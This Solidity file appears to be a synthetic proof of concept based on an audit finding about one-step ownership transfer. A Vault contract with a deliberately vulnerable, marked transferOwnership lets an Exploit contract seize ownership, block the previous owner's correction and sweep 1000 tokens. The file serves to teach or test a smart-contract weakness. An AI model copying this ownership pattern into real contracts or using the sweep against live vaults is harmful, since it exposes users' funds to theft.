// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Reserve Main — one-step ownership transfer
    (Trail of Bits, August 2022).
    SYNTHETIC, cheatcode-free. No time warp.
    transferOwnership writes the new owner immediately. The previous owner
    cannot correct the address, and the new owner sweeps 1000.
    Two-step only stores a pending owner. After the real owner points that
    slot at the guardian, the attacker's acceptOwnership reverts and the
    sweep pays 0. */

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HotOwner {
    function handOff(address vault, address next) external {
        Vault(vault).transferOwnership(next);
    }
}

contract Vault {
    Token public token;
    address public owner;
    address public pendingOwner;
    address public previousOwner;

    constructor(Token token_, address owner_) {
        token = token_;
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    function transferOwnership(address newOwner) external virtual onlyOwner {
        this.commitOwner(newOwner);
    }

    function commitOwner(address newOwner) external {
        require(msg.sender == address(this), "vault");
        // @> VULN: one step. The new address is owner immediately, so the transfer cannot be reversed.
        owner = newOwner;
    }

    function sweep() external onlyOwner {
        uint256 bal = token.balanceOf(address(this));
        taken = bal;
        token.transfer(owner, bal);
    }

    uint256 public taken;
}

contract Exploit {
    Token public token; // nonce 1
    HotOwner public hot; // nonce 2
    Vault public vault; // nonce 3

    constructor() {
        token = new Token();
        hot = new HotOwner();
        vault = new Vault(token, address(hot));
        token.mint(address(vault), 1000);
    }

    function run() external {
        hot.handOff(address(vault), address(this));
        (bool undone,) = address(hot).call(
            abi.encodeWithSelector(HotOwner.handOff.selector, address(vault), address(0xBEEF))
        );
        vault.sweep();
        require(undone == false, "previous owner could not undo");
        require(vault.owner() == address(this), "attacker is not owner");
        require(token.balanceOf(address(this)) == 1000, "attacker did not pull 1000");
        require(vault.taken() == 1000, "sweep was not 1000");
    }
}
